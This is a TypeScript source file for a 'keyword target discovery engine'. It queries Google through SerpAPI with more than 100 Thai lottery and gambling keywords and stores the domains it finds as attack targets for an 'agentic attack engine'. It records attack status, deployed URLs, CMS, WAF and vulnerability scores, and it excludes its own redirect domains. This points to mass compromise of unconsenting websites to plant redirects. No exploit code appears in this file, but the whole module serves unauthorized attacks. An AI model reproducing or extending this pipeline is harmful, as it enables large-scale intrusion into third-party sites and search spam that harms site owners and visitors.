/**
 * SerpAPI Keyword Target Discovery Engine
 * 
 * Uses SerpAPI to search for lottery-related websites using Thai keywords.
 * Discovered websites become attack targets fed into the agentic attack engine.
 * 
 * Flow:
 *   1. Load keywords from DB (100+ Thai lottery keywords)
 *   2. Search each keyword via SerpAPI (Google search)
 *   3. Extract domains from organic results
 *   4. Filter: deduplicate, remove blacklisted, remove own redirect domains
 *   5. Store discovered targets in DB
 *   6. Feed targets to agentic attack engine
 * 
 * Integrates with:
 *   - serp-api.ts (SerpAPI client)
 *   - attack-blacklist.ts (skip blacklisted domains)
 *   - agentic-attack-engine.ts (attack discovered targets)
 *   - telegram-notifier.ts (notify on success)
 */

import { getDb } from "./db";
import { serpKeywords, serpDiscoveredTargets, serpSearchRuns } from "../drizzle/schema";
import { eq, desc, and, sql, inArray, isNull, or } from "drizzle-orm";
import { searchGoogle, getAccountInfo, type SerpResult } from "./serp-api";
import { isBlacklisted, isOwnRedirectUrl } from "./attack-blacklist";
import { getRedirectUrls } from "./agentic-attack-engine";

// ═══════════════════════════════════════════════════════
//  DEFAULT LOTTERY KEYWORDS (100+ Thai keywords)
// ═══════════════════════════════════════════════════════

export const DEFAULT_LOTTERY_KEYWORDS: string[] = [
  // หวยออนไลน์ & ตรวจหวย
  "หวยออนไลน์", "ตรวจหวย", "หวยลาว", "ตรวจลอตเตอรี่", "สลากกินแบ่งรัฐบาล",
  "ตรวจหวยวันนี้", "ผลหวยลาว", "ตรวจสลากกินแบ่งรัฐบาล", "หวยลาววันนี้ออกอะไร",
  "ตรวจหวยลาว", "ลอตเตอรี่", "หวยออก", "ผลหวยลาววันนี้", "หวยวันนี้",
  "หวยลาวย้อนหลัง", "ผลสลาก", "หวยลาวออกอะไร", "หวยลาวออกวันนี้",
  "ตรวจหวยลาววันนี้", "ผลสลากกินแบ่งรัฐบาล", "ตรวจสลาก",
  
  // English lottery
  "lottery", "lotto", "thai lottery", "thai lottery today",
  
  // ตรวจหวยย้อนหลัง
  "ตรวจหวยย้อนหลัง", "ตรวจหวยล่าสุด", "หวยออกอะไร", "เช็คหวย",
  "ผลสลากกินแบ่งรัฐบาลงวด", "ผลหวย", "สถิติหวย",
  
  // หวยลาว
  "หวยลาวล่าสุด", "หวยรัฐบาล", "ตรวจหวยรัฐบาล", "ตรวจ-หวย",
  "ตรวจ หวยลาว", "พัฒนา", "รางวัลที่1", "หวยลาวพัฒนาวันนี้",
  "เลขลาว", "หวยลาวพัฒนา", "หวยย้อนหลัง", "หวยไทยรัฐ",
  "หวยลาวออก", "เลขลาววันนี้", "หวยลาว ย้อน หลัง",
  
  // สลากออมสิน & กองสลาก
  "สลากออมสิน", "แนวทางหวยลาววันนี้", "หวยลาว 6 ตัว วันนี้",
  "หวยลาวออกอะไรวันนี้", "กองสลากพลัส", "ตรวจหวยงวดนี้",
  
  // หวยออกวัน
  "หวยออกวันไหน", "หวยออกวันนี้", "หวยไทย", "ตวดหวยวันนี้",
  "เว็บหวย", "วิธีตรวจสลากกินแบ่งรัฐบาล", "เช็คลอตเตอรี่",
  "หวยลาววันนี้ 4 ตัว", "หวยล่าสุด", "หวยงวดนี้", "หวยงวดที่แล้ว",
  "ถ่ายทอดสดหวยลาววันนี้", "ล็อตโต้",
  
  // หวยหุ้น & แทงหวย
  "ผลหวยหุ้น", "แทงหวย24", "lottovip เข้าสู่ระบบ", "รับหวย24",
  "หวยออนไลน์ lotto",
  
  // หวยฮานอย
  "หวยฮานอย", "หวยฮานอย วันนี้ ออกอะไร", "หวยฮานอยvip",
  "หวยฮานอย vip วันนี้ สด", "หวยฮานอย ย้อน หลัง", "หวยฮานอย lotto",
  "หวยฮานอย vip วันนี้", "ฮานอยวันนี้", "หวยฮานอยวันนี้",
  "ผลฮานอยวันนี้", "ผลหวยฮานอย", "ผลหวยฮานอยพิเศษ",
  "ผลหวยฮานอยวันนี้", "ผลฮานอย", "ฮานอยปกติ",
  
  // หวยไทย & เวียดนาม
  "หวยไทย", "ตรวจหวยไทย", "หวยเวียดนาม", "หวยเวียดนามวันนี้",
  "หวยรางวัลที่ 1",
  
  // แทงหวย
  "แทงหวย", "แทงหวย100", "แทงหวย 24", "แทงหวย365", "แทงหวยออนไลน์",
];

// ═══════════════════════════════════════════════════════
//  SKIP DOMAINS — Never target these
// ═══════════════════════════════════════════════════════

const SKIP_DOMAINS = new Set([
  "google.com", "google.co.th", "google.co.jp",
  "youtube.com", "facebook.com", "twitter.com", "x.com",
  "instagram.com", "tiktok.com", "line.me",
  "wikipedia.org", "amazon.com", "microsoft.com", "apple.com",
  "github.com", "stackoverflow.com", "reddit.com",
  "sanook.com", "pantip.com", "kapook.com", "thairath.co.th",
  "dailynews.co.th", "matichon.co.th", "bangkokpost.com",
  "khaosod.co.th", "prachachat.net", "mgronline.com",
  // Government sites
  "glo.or.th", "mof.go.th", "bot.or.th",
  // Major platforms
  "shopee.co.th", "lazada.co.th", "grab.com",
]);

function shouldSkipDomain(domain: string): boolean {
  const clean = domain.toLowerCase().replace(/^www\./, "");
  for (const skip of Array.from(SKIP_DOMAINS)) {
    if (clean === skip || clean.endsWith(`.${skip}`)) return true;
  }
  return false;
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function extractDomain(url: string): string {
  try {
    const parsed = new URL(url.startsWith("http") ? url : `https://${url}`);
    return parsed.hostname.toLowerCase().replace(/^www\./, "");
  } catch {
    return url.replace(/^https?:\/\//, "").split("/")[0].split(":")[0].toLowerCase().replace(/^www\./, "");
  }
}

// ═══════════════════════════════════════════════════════
//  1. SEED DEFAULT KEYWORDS
// ═══════════════════════════════════════════════════════

export async function seedDefaultKeywords(): Promise<{ added: number; existing: number }> {
  const db = await getDb();
  if (!db) return { added: 0, existing: 0 };

  // Get existing keywords
  const existing = await db.select({ keyword: serpKeywords.keyword }).from(serpKeywords);
  const existingSet = new Set(existing.map(e => e.keyword.toLowerCase()));

  let added = 0;
  for (const kw of DEFAULT_LOTTERY_KEYWORDS) {
    if (!existingSet.has(kw.toLowerCase())) {
      await db.insert(serpKeywords).values({
        keyword: kw,
        category: "lottery",
        language: "th",
        country: "th",
      });
      added++;
    }
  }

  return { added, existing: existingSet.size };
}

// ═══════════════════════════════════════════════════════
//  2. SEARCH KEYWORDS VIA SERPAPI
// ═══════════════════════════════════════════════════════

export interface KeywordSearchResult {
  keyword: string;
  keywordId: number;
  results: SerpResult[];
  domainsFound: string[];
  error?: string;
}

export async function searchKeyword(
  keyword: string,
  keywordId: number,
): Promise<KeywordSearchResult> {
  const result: KeywordSearchResult = {
    keyword,
    keywordId,
    results: [],
    domainsFound: [],
  };

  try {
    const serpData = await searchGoogle(keyword, {
      gl: "th",
      hl: "th",
      num: 100, // Get max results
    });

    if (!serpData) {
      result.error = "SerpAPI returned null (API key missing or rate limited)";
      return result;
    }

    result.results = serpData.results;
    
    // Extract unique domains
    const domainSet = new Set<string>();
    for (const r of serpData.results) {
      const domain = extractDomain(r.link);
      if (domain && !shouldSkipDomain(domain)) {
        domainSet.add(domain);
      }
    }
    result.domainsFound = Array.from(domainSet);

  } catch (err: any) {
    result.error = err.message;
  }

  return result;
}

// ═══════════════════════════════════════════════════════
//  3. MAIN DISCOVERY RUN
// ═══════════════════════════════════════════════════════

export interface DiscoveryRunConfig {
  maxKeywords?: number;         // Max keywords to search per run (default: 20)
  delayBetweenSearches?: number; // ms delay between SerpAPI calls (default: 2500)
  triggeredBy?: string;          // "manual" | "scheduler" | "daemon"
  onProgress?: (phase: string, detail: string, progress: number) => void;
}

export interface DiscoveryRunResult {
  runId: number;
  keywordsSearched: number;
  rawResultsFound: number;
  uniqueDomainsFound: number;
  newTargetsAdded: number;
  duplicatesSkipped: number;
  blacklistedSkipped: number;
  errors: string[];
  targets: Array<{
    domain: string;
    url: string;
    title: string;
    keyword: string;
    serpPosition: number;
  }>;
}

export async function runKeywordDiscovery(
  config: DiscoveryRunConfig = {},
): Promise<DiscoveryRunResult> {
  const db = await getDb();
  if (!db) throw new Error("Database not available");

  const maxKeywords = config.maxKeywords ?? 20;
  const delay = config.delayBetweenSearches ?? 2500;
  const onProgress = config.onProgress;

  // Create search run record
  const [run] = await db.insert(serpSearchRuns).values({
    status: "running",
    totalKeywords: maxKeywords,
    triggeredBy: config.triggeredBy || "manual",
  }).$returningId();
  const runId = run.id;

  const result: DiscoveryRunResult = {
    runId,
    keywordsSearched: 0,
    rawResultsFound: 0,
    uniqueDomainsFound: 0,
    newTargetsAdded: 0,
    duplicatesSkipped: 0,
    blacklistedSkipped: 0,
    errors: [],
    targets: [],
  };

  try {
    // Seed keywords if none exist
    const kwCount = await db.select({ count: sql<number>`count(*)` }).from(serpKeywords);
    if ((kwCount[0]?.count ?? 0) === 0) {
      onProgress?.("seed", "Seeding default lottery keywords...", 2);
      await seedDefaultKeywords();
    }

    // Get active keywords, prioritize least-recently-searched
    const keywords = await db.select()
      .from(serpKeywords)
      .where(eq(serpKeywords.isActive, true))
      .orderBy(serpKeywords.lastSearchedAt) // null (never searched) first, then oldest
      .limit(maxKeywords);

    if (keywords.length === 0) {
      result.errors.push("No active keywords found");
      await db.update(serpSearchRuns).set({ status: "error", errors: result.errors, completedAt: new Date() }).where(eq(serpSearchRuns.id, runId));
      return result;
    }

    onProgress?.("search", `Starting keyword search: ${keywords.length} keywords`, 5);

    // Get redirect URLs for self-attack prevention
    const redirectUrls = await getRedirectUrls();

    // Get existing discovered domains to avoid duplicates
    const existingTargets = await db.select({ domain: serpDiscoveredTargets.domain })
      .from(serpDiscoveredTargets);
    const existingDomains = new Set(existingTargets.map(t => t.domain.toLowerCase()));

    // Search each keyword
    const allDiscovered: Array<{
      domain: string;
      url: string;
      title: string;
      snippet: string;
      serpPosition: number;
      keyword: string;
      keywordId: number;
    }> = [];

    for (let i = 0; i < keywords.length; i++) {
      const kw = keywords[i];
      const pct = 5 + Math.round((i / keywords.length) * 70);
      onProgress?.("search", `[${i + 1}/${keywords.length}] Searching: "${kw.keyword}"`, pct);

      const searchResult = await searchKeyword(kw.keyword, kw.id);
      result.keywordsSearched++;
      result.rawResultsFound += searchResult.results.length;

      if (searchResult.error) {
        result.errors.push(`${kw.keyword}: ${searchResult.error}`);
      }

      // Process results
      for (const r of searchResult.results) {
        const domain = extractDomain(r.link);
        if (!domain || shouldSkipDomain(domain)) continue;

        allDiscovered.push({
          domain,
          url: r.link,
          title: r.title,
          snippet: r.snippet,
          serpPosition: r.position,
          keyword: kw.keyword,
          keywordId: kw.id,
        });
      }

      // Update keyword search stats
      await db.update(serpKeywords).set({
        lastSearchedAt: new Date(),
        totalSearches: sql`${serpKeywords.totalSearches} + 1`,
        totalTargetsFound: sql`${serpKeywords.totalTargetsFound} + ${searchResult.domainsFound.length}`,
      }).where(eq(serpKeywords.id, kw.id));

      // Update run progress
      await db.update(serpSearchRuns).set({
        keywordsSearched: result.keywordsSearched,
        rawResultsFound: result.rawResultsFound,
      }).where(eq(serpSearchRuns.id, runId));

      // Respect SerpAPI rate limits
      if (i < keywords.length - 1) {
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }

    onProgress?.("filter", `Filtering ${allDiscovered.length} raw results...`, 80);

    // Deduplicate by domain (keep highest SERP position)
    const domainMap = new Map<string, typeof allDiscovered[0]>();
    for (const d of allDiscovered) {
      const key = d.domain.toLowerCase();
      if (!domainMap.has(key) || d.serpPosition < (domainMap.get(key)!.serpPosition || 999)) {
        domainMap.set(key, d);
      }
    }
    const uniqueTargets = Array.from(domainMap.values());
    result.uniqueDomainsFound = uniqueTargets.length;

    onProgress?.("filter", `${uniqueTargets.length} unique domains, checking blacklist...`, 85);

    // Filter: blacklist + self-redirect + already discovered
    for (const target of uniqueTargets) {
      const domainLower = target.domain.toLowerCase();

      // Skip already discovered
      if (existingDomains.has(domainLower)) {
        result.duplicatesSkipped++;
        continue;
      }

      // Skip blacklisted
      const blacklistResult = await isBlacklisted(target.domain);
      if (blacklistResult.blacklisted) {
        result.blacklistedSkipped++;
        continue;
      }

      // Skip self-redirect
      const isSelf = await isOwnRedirectUrl(target.url, redirectUrls);
      if (isSelf) {
        result.blacklistedSkipped++;
        continue;
      }

      // Insert new target
      await db.insert(serpDiscoveredTargets).values({
        domain: target.domain,
        url: target.url,
        title: target.title,
        snippet: target.snippet,
        serpPosition: target.serpPosition,
        keyword: target.keyword,
        keywordId: target.keywordId,
        status: "discovered",
      });

      result.newTargetsAdded++;
      result.targets.push({
        domain: target.domain,
        url: target.url,
        title: target.title || "",
        keyword: target.keyword,
        serpPosition: target.serpPosition,
      });

      existingDomains.add(domainLower); // Prevent duplicates within same run
    }

    onProgress?.("complete", `Discovery complete: ${result.newTargetsAdded} new targets`, 100);

    // Update run record
    await db.update(serpSearchRuns).set({
      status: "completed",
      keywordsSearched: result.keywordsSearched,
      rawResultsFound: result.rawResultsFound,
      uniqueDomainsFound: result.uniqueDomainsFound,
      newTargetsAdded: result.newTargetsAdded,
      duplicatesSkipped: result.duplicatesSkipped,
      blacklistedSkipped: result.blacklistedSkipped,
      errors: result.errors.length > 0 ? result.errors : null,
      completedAt: new Date(),
    }).where(eq(serpSearchRuns.id, runId));

  } catch (err: any) {
    result.errors.push(err.message);
    await db.update(serpSearchRuns).set({
      status: "error",
      errors: result.errors,
      completedAt: new Date(),
    }).where(eq(serpSearchRuns.id, runId));
  }

  return result;
}

// ═══════════════════════════════════════════════════════
//  4. GET QUEUED TARGETS FOR ATTACK
// ═══════════════════════════════════════════════════════

export async function getQueuedTargets(
  limit: number = 50,
): Promise<Array<{
  id: number;
  domain: string;
  url: string;
  keyword: string;
  serpPosition: number | null;
}>> {
  const db = await getDb();
  if (!db) return [];

  return db.select({
    id: serpDiscoveredTargets.id,
    domain: serpDiscoveredTargets.domain,
    url: serpDiscoveredTargets.url,
    keyword: serpDiscoveredTargets.keyword,
    serpPosition: serpDiscoveredTargets.serpPosition,
  })
    .from(serpDiscoveredTargets)
    .where(
      or(
        eq(serpDiscoveredTargets.status, "discovered"),
        eq(serpDiscoveredTargets.status, "queued"),
      )
    )
    .orderBy(serpDiscoveredTargets.serpPosition) // Higher SERP position = more relevant
    .limit(limit);
}

/**
 * Mark targets as queued for attack
 */
export async function markTargetsQueued(targetIds: number[]): Promise<void> {
  const db = await getDb();
  if (!db || targetIds.length === 0) return;

  await db.update(serpDiscoveredTargets)
    .set({ status: "queued" })
    .where(inArray(serpDiscoveredTargets.id, targetIds));
}

/**
 * Update target status after attack
 */
export async function updateTargetStatus(
  targetId: number,
  status: "attacking" | "success" | "failed" | "blacklisted" | "skipped",
  details?: {
    attackSessionId?: number;
    attackResult?: string;
    deployedUrls?: string[];
    cms?: string;
    serverType?: string;
    waf?: string;
    vulnScore?: number;
  },
): Promise<void> {
  const db = await getDb();
  if (!db) return;

  const updateData: Record<string, any> = { status };
  if (status === "attacking") updateData.attackedAt = new Date();
  if (details?.attackSessionId) updateData.attackSessionId = details.attackSessionId;
  if (details?.attackResult) updateData.attackResult = details.attackResult;
  if (details?.deployedUrls) updateData.deployedUrls = details.deployedUrls;
  if (details?.cms) updateData.cms = details.cms;
  if (details?.serverType) updateData.serverType = details.serverType;
  if (details?.waf) updateData.waf = details.waf;
  if (details?.vulnScore != null) updateData.vulnScore = details.vulnScore;

  await db.update(serpDiscoveredTargets)
    .set(updateData)
    .where(eq(serpDiscoveredTargets.id, targetId));
}

// ═══════════════════════════════════════════════════════
//  5. STATS & QUERIES
// ═══════════════════════════════════════════════════════

export async function getKeywordDiscoveryStats(): Promise<{
  totalKeywords: number;
  activeKeywords: number;
  totalTargets: number;
  targetsByStatus: Record<string, number>;
  totalSearchRuns: number;
  lastRunAt: string | null;
  serpApiRemaining: number | null;
  topKeywords: Array<{ keyword: string; targetsFound: number; lastSearched: string | null }>;
}> {
  const db = await getDb();
  if (!db) return {
    totalKeywords: 0, activeKeywords: 0, totalTargets: 0,
    targetsByStatus: {}, totalSearchRuns: 0, lastRunAt: null,
    serpApiRemaining: null, topKeywords: [],
  };

  // Keyword stats
  const kwStats = await db.select({
    total: sql<number>`count(*)`,
    active: sql<number>`sum(CASE WHEN ${serpKeywords.isActive} = 1 THEN 1 ELSE 0 END)`,
  }).from(serpKeywords);

  // Target stats by status
  const targetStats = await db.select({
    status: serpDiscoveredTargets.status,
    count: sql<number>`count(*)`,
  }).from(serpDiscoveredTargets).groupBy(serpDiscoveredTargets.status);

  const targetsByStatus: Record<string, number> = {};
  let totalTargets = 0;
  for (const s of targetStats) {
    targetsByStatus[s.status] = s.count;
    totalTargets += s.count;
  }

  // Search run stats
  const runStats = await db.select({
    total: sql<number>`count(*)`,
    lastRun: sql<string>`MAX(${serpSearchRuns.startedAt})`,
  }).from(serpSearchRuns);

  // Top keywords by targets found
  const topKeywords = await db.select({
    keyword: serpKeywords.keyword,
    targetsFound: serpKeywords.totalTargetsFound,
    lastSearched: serpKeywords.lastSearchedAt,
  })
    .from(serpKeywords)
    .orderBy(desc(serpKeywords.totalTargetsFound))
    .limit(10);

  // SerpAPI account info
  let serpApiRemaining: number | null = null;
  try {
    const account = await getAccountInfo();
    serpApiRemaining = account?.remaining ?? null;
  } catch { /* ignore */ }

  return {
    totalKeywords: kwStats[0]?.total ?? 0,
    activeKeywords: kwStats[0]?.active ?? 0,
    totalTargets,
    targetsByStatus,
    totalSearchRuns: runStats[0]?.total ?? 0,
    lastRunAt: runStats[0]?.lastRun ?? null,
    serpApiRemaining,
    topKeywords: topKeywords.map(k => ({
      keyword: k.keyword,
      targetsFound: k.targetsFound,
      lastSearched: k.lastSearched?.toISOString() ?? null,
    })),
  };
}

export async function getDiscoveredTargets(
  page: number = 1,
  limit: number = 50,
  statusFilter?: string,
): Promise<{
  targets: Array<{
    id: number;
    domain: string;
    url: string;
    title: string | null;
    keyword: string;
    serpPosition: number | null;
    status: string;
    cms: string | null;
    vulnScore: number | null;
    discoveredAt: Date;
    attackedAt: Date | null;
    deployedUrls: string[] | null;
  }>;
  total: number;
  page: number;
  totalPages: number;
}> {
  const db = await getDb();
  if (!db) return { targets: [], total: 0, page: 1, totalPages: 0 };

  const offset = (page - 1) * limit;

  const whereClause = statusFilter
    ? eq(serpDiscoveredTargets.status, statusFilter as any)
    : undefined;

  const [countResult] = await db.select({ count: sql<number>`count(*)` })
    .from(serpDiscoveredTargets)
    .where(whereClause);
  const total = countResult?.count ?? 0;

  const targets = await db.select()
    .from(serpDiscoveredTargets)
    .where(whereClause)
    .orderBy(desc(serpDiscoveredTargets.discoveredAt))
    .limit(limit)
    .offset(offset);

  return {
    targets: targets.map(t => ({
      id: t.id,
      domain: t.domain,
      url: t.url,
      title: t.title,
      keyword: t.keyword,
      serpPosition: t.serpPosition,
      status: t.status,
      cms: t.cms,
      vulnScore: t.vulnScore,
      discoveredAt: t.discoveredAt,
      attackedAt: t.attackedAt,
      deployedUrls: t.deployedUrls,
    })),
    total,
    page,
    totalPages: Math.ceil(total / limit),
  };
}

export async function getSearchRuns(
  limit: number = 20,
): Promise<Array<{
  id: number;
  status: string;
  keywordsSearched: number;
  totalKeywords: number;
  newTargetsAdded: number;
  uniqueDomainsFound: number;
  startedAt: Date;
  completedAt: Date | null;
  triggeredBy: string;
}>> {
  const db = await getDb();
  if (!db) return [];

  return db.select({
    id: serpSearchRuns.id,
    status: serpSearchRuns.status,
    keywordsSearched: serpSearchRuns.keywordsSearched,
    totalKeywords: serpSearchRuns.totalKeywords,
    newTargetsAdded: serpSearchRuns.newTargetsAdded,
    uniqueDomainsFound: serpSearchRuns.uniqueDomainsFound,
    startedAt: serpSearchRuns.startedAt,
    completedAt: serpSearchRuns.completedAt,
    triggeredBy: serpSearchRuns.triggeredBy,
  })
    .from(serpSearchRuns)
    .orderBy(desc(serpSearchRuns.startedAt))
    .limit(limit);
}

// ═══════════════════════════════════════════════════════
//  6. KEYWORD MANAGEMENT
// ═══════════════════════════════════════════════════════

export async function addKeywords(
  keywords: string[],
  category: string = "lottery",
): Promise<{ added: number; duplicates: number }> {
  const db = await getDb();
  if (!db) return { added: 0, duplicates: 0 };

  const existing = await db.select({ keyword: serpKeywords.keyword }).from(serpKeywords);
  const existingSet = new Set(existing.map(e => e.keyword.toLowerCase()));

  let added = 0;
  let duplicates = 0;

  for (const kw of keywords) {
    const clean = kw.trim();
    if (!clean) continue;
    if (existingSet.has(clean.toLowerCase())) {
      duplicates++;
      continue;
    }
    await db.insert(serpKeywords).values({
      keyword: clean,
      category,
      language: "th",
      country: "th",
    });
    existingSet.add(clean.toLowerCase());
    added++;
  }

  return { added, duplicates };
}

export async function removeKeyword(keywordId: number): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  await db.delete(serpKeywords).where(eq(serpKeywords.id, keywordId));
  return true;
}

export async function toggleKeyword(keywordId: number, isActive: boolean): Promise<boolean> {
  const db = await getDb();
  if (!db) return false;

  await db.update(serpKeywords).set({ isActive }).where(eq(serpKeywords.id, keywordId));
  return true;
}

export async function getKeywords(
  page: number = 1,
  limit: number = 100,
): Promise<{
  keywords: Array<{
    id: number;
    keyword: string;
    category: string;
    isActive: boolean;
    lastSearchedAt: Date | null;
    totalSearches: number;
    totalTargetsFound: number;
  }>;
  total: number;
}> {
  const db = await getDb();
  if (!db) return { keywords: [], total: 0 };

  const offset = (page - 1) * limit;

  const [countResult] = await db.select({ count: sql<number>`count(*)` }).from(serpKeywords);
  const total = countResult?.count ?? 0;

  const keywords = await db.select()
    .from(serpKeywords)
    .orderBy(desc(serpKeywords.totalTargetsFound))
    .limit(limit)
    .offset(offset);

  return {
    keywords: keywords.map(k => ({
      id: k.id,
      keyword: k.keyword,
      category: k.category,
      isActive: k.isActive,
      lastSearchedAt: k.lastSearchedAt,
      totalSearches: k.totalSearches,
      totalTargetsFound: k.totalTargetsFound,
    })),
    total,
  };
}
